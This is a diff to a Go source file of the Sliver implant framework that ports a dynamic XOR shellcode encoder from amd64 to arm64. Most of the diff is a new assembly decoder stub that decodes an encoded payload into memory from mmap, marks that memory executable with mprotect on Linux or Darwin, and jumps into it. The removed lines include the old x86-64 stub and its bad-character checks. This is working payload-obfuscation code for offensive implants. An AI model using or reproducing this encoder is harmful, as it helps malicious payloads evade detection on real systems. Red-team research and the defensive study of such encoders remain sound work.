@@ -1,4 +1,4 @@
-package amd64
+package arm64
 
 /*
 	Sliver Implant Framework
@@ -16,35 +16,31 @@ package amd64
 
 	You should have received a copy of the GNU General Public License
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
-	------------------------------------------------------------------------
-
-	Based on the Metasploit x64/xor_dynamic encoder by lupman, phra
-
 */
 
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/binary"
 	"fmt"
 	"strings"
 
 	"github.com/moloch--/go-keystone"
 )
 
-const (
-	xorDynamicKeyPlaceholder     = 0x41
-	xorDynamicPayloadPlaceholder = 0x42
-	xorDynamicStubSize           = 46
-	xorDynamicStubSizeDword      = xorDynamicStubSize + 1
-)
-
+// xorDynamicBadchars are used when generating/selecting terminators and keys.
+// Note: unlike the amd64 Metasploit xor_dynamic implementation, the arm64
+// decoder stub is not guaranteed to be badchar-free.
 var xorDynamicBadchars = map[byte]bool{
 	0x00: true,
 	0x0a: true,
 	0x0d: true,
 }
 
-// XorDynamic encodes an amd64 payload using the Metasploit x64/xor_dynamic scheme.
+// XorDynamic encodes an arm64 payload using a dynamic XOR scheme with:
+//
+//	stub + key + keyTerm + encodedPayload + payloadTerm
+//
 // If key includes a trailing key terminator + payload terminator (3 bytes) that satisfy the
 // encoder constraints, those are used verbatim.
 //
@@ -108,10 +104,6 @@ func XorDynamic(data []byte, key []byte) ([]byte, error) {
 	final = append(final, encoded...)
 	final = append(final, payloadTerm...)
 
-	if containsBadchars(final, xorDynamicBadchars) {
-		return nil, fmt.Errorf("xor_dynamic encoder: badchars present in output")
-	}
-
 	return final, nil
 }
 
@@ -169,7 +161,7 @@ func selectPayloadTerm(encoded []byte) ([]byte, error) {
 	allowed := allowedDynamicChars()
 
 	// Fast path: try to find a distinct 2-byte terminator not present in the
-	// encoded payload. This preserves compatibility with the Metasploit stub.
+	// encoded payload.
 	present := make([]bool, 1<<16)
 	for i := 0; i+1 < len(encoded); i++ {
 		present[int(encoded[i])<<8|int(encoded[i+1])] = true
@@ -242,96 +234,126 @@ func buildXorDynamicStub(keyTerm byte, payloadTerm []byte) ([]byte, error) {
 		return nil, fmt.Errorf("xor_dynamic encoder: payload terminator must be 2 or 4 bytes")
 	}
 
-	engine, err := keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
+	engine, err := keystone.NewEngine(keystone.ARCH_ARM64, keystone.MODE_LITTLE_ENDIAN)
 	if err != nil {
 		return nil, err
 	}
 	defer func() { _ = engine.Close() }()
 
-	if err := engine.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL); err != nil {
-		return nil, err
-	}
-
-	cmpLine := "cmp word ptr [rdi], 0x4242"
-	if len(payloadTerm) == 4 {
-		cmpLine = "cmp dword ptr [rdi], 0x42424242"
+	var payloadLoad string
+	var payloadVal uint64
+	switch len(payloadTerm) {
+	case 2:
+		payloadLoad = "ldrh w7, [x9]"
+		payloadVal = uint64(binary.LittleEndian.Uint16(payloadTerm))
+	case 4:
+		payloadLoad = "ldr w7, [x9]"
+		payloadVal = uint64(binary.LittleEndian.Uint32(payloadTerm))
+	default:
+		return nil, fmt.Errorf("xor_dynamic encoder: invalid payload terminator length %d", len(payloadTerm))
 	}
 
 	src := strings.Join([]string{
-		".code64",
-		"jmp _call",
-		"_ret:",
-		"pop rbx",
-		"push rbx",
-		"pop rdi",
-		"mov al, 0x41",
-		"cld",
-		"_lp1:",
-		"scasb",
-		"jne _lp1",
-		"push rdi",
-		"pop rcx",
-		"_lp2:",
-		"push rbx",
-		"pop rsi",
-		"_lp3:",
-		"mov al, byte ptr [rsi]",
-		"xor byte ptr [rdi], al",
-		"inc rdi",
-		"inc rsi",
-		cmpLine,
-		"je _jmp",
-		"cmp byte ptr [rsi], 0x41",
-		"jne _lp3",
-		"jmp _lp2",
-		"_jmp:",
-		"jmp rcx",
-		"_call:",
-		"call _ret",
+		"adr x19, payload",  // x19 = key start
+		"mov x1, x19",       // x1 = scan pointer
+		"find_key_term:",    //
+		"ldrb w2, [x1], #1", // read key byte
+		fmt.Sprintf("cmp w2, #0x%02X", keyTerm),
+		"b.ne find_key_term", // keep scanning
+		"mov x20, x1",        // x20 = payload start / jump target
+		"mov x3, x1",         // x3 = payload decode pointer
+		"mov x4, x19",        // x4 = key decode pointer
+		fmt.Sprintf("movz x10, #0x%X", uint16(payloadVal&0xffff)),
+		fmt.Sprintf("movk x10, #0x%X, lsl #16", uint16((payloadVal>>16)&0xffff)),
+		fmt.Sprintf("movk x10, #0x%X, lsl #32", uint16((payloadVal>>32)&0xffff)),
+		fmt.Sprintf("movk x10, #0x%X, lsl #48", uint16((payloadVal>>48)&0xffff)),
+
+		// Scan for the payload terminator (it is guaranteed not to occur in the
+		// encoded payload), then allocate a RW buffer, decode into it, mprotect
+		// to RX, and jump.
+		"mov x9, x3", // x9 = scan pointer
+		"find_payload_term:",
+		payloadLoad,
+		"cmp w7, w10",
+		"b.eq payload_term_found",
+		"add x9, x9, #1",
+		"b find_payload_term",
+		"payload_term_found:",
+		"sub x22, x9, x20", // x22 = payload len in bytes (terminator excluded)
+
+		// mmap(NULL, payloadLen, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
+		"mov x0, #0",
+		"mov x1, x22",
+		"mov x2, #3",      // PROT_READ|PROT_WRITE
+		"mov x3, #0x1002", // MAP_PRIVATE|MAP_ANON (darwin)
+		"mov x4, #-1",
+		"mov x5, #0",
+		"mov x8, #222", // Linux: __NR_mmap
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
+		"svc #0",
+		// Darwin MAP_ANON is 0x1000, Linux MAP_ANONYMOUS is 0x20.
+		// Try Darwin flags first, then retry with Linux flags if the syscall fails.
+		"tbnz x0, #63, mmap_linux",
+		"b mmap_ok",
+		"mmap_linux:",
+		"mov x0, #0",
+		"mov x1, x22",
+		"mov x2, #3",    // PROT_READ|PROT_WRITE
+		"mov x3, #0x22", // MAP_PRIVATE|MAP_ANONYMOUS (linux)
+		"mov x4, #-1",
+		"mov x5, #0",
+		"mov x8, #222", // Linux: __NR_mmap
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
+		"svc #0",
+		"mmap_ok:",
+		"mov x23, x0", // x23 = dest base
+		"mov x24, x0", // x24 = dest ptr
+		"mov x3, x20", // restore src pointer (payload start)
+		"mov x4, x19", // restore key pointer
+
+		"decode_loop:",
+		"cmp x3, x9", // reached terminator?
+		"b.eq decode_done",
+
+		"ldrb w5, [x4], #1", // load key byte
+		fmt.Sprintf("cmp w5, #0x%02X", keyTerm),
+		"b.ne have_key",
+		"mov x4, x19",       // reset key pointer
+		"ldrb w5, [x4], #1", // load first key byte
+		"have_key:",
+		"ldrb w6, [x3], #1", // load payload byte + advance
+		"eor w6, w6, w5",
+		"strb w6, [x24], #1", // store + advance dest
+		"b decode_loop",
+
+		"decode_done:",
+		// mprotect(dst, payloadLen, PROT_READ|PROT_EXEC)
+		"mov x0, x23",
+		"mov x1, x22",
+		"mov x2, #5",   // PROT_READ|PROT_EXEC
+		"mov x8, #226", // Linux: __NR_mprotect
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x0200004A&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x0200004A>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x0200004A>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x0200004A>>48)&0xffff)),
+		"svc #0",
+		"br x23", // jump to decoded payload
+		"payload:",
 	}, "\n")
 
 	inst, err := engine.Assemble(src, 0)
 	if err != nil {
 		return nil, err
 	}
-
-	expectedStubSize := xorDynamicStubSize
-	if len(payloadTerm) == 4 {
-		expectedStubSize = xorDynamicStubSizeDword
-	}
-	if len(inst) != expectedStubSize {
+	if len(inst) == 0 || len(inst)%4 != 0 {
 		return nil, fmt.Errorf("xor_dynamic encoder: unexpected stub length %d", len(inst))
 	}
-
-	keyReplaced := 0
-	for i := range inst {
-		if inst[i] == xorDynamicKeyPlaceholder {
-			inst[i] = keyTerm
-			keyReplaced++
-		}
-	}
-	if keyReplaced == 0 {
-		return nil, fmt.Errorf("xor_dynamic encoder: key placeholder not found")
-	}
-
-	payloadReplaced := 0
-	placeholder := bytes.Repeat([]byte{xorDynamicPayloadPlaceholder}, len(payloadTerm))
-	for i := 0; i+len(placeholder) <= len(inst); i++ {
-		if !bytes.Equal(inst[i:i+len(placeholder)], placeholder) {
-			continue
-		}
-		copy(inst[i:i+len(payloadTerm)], payloadTerm)
-		payloadReplaced++
-		i += len(payloadTerm) - 1
-	}
-	if payloadReplaced == 0 {
-		return nil, fmt.Errorf("xor_dynamic encoder: payload placeholder not found")
-	}
-
-	if containsBadchars(inst, xorDynamicBadchars) {
-		return nil, fmt.Errorf("xor_dynamic encoder: badchars present in stub")
-	}
-
 	return inst, nil
 }
 
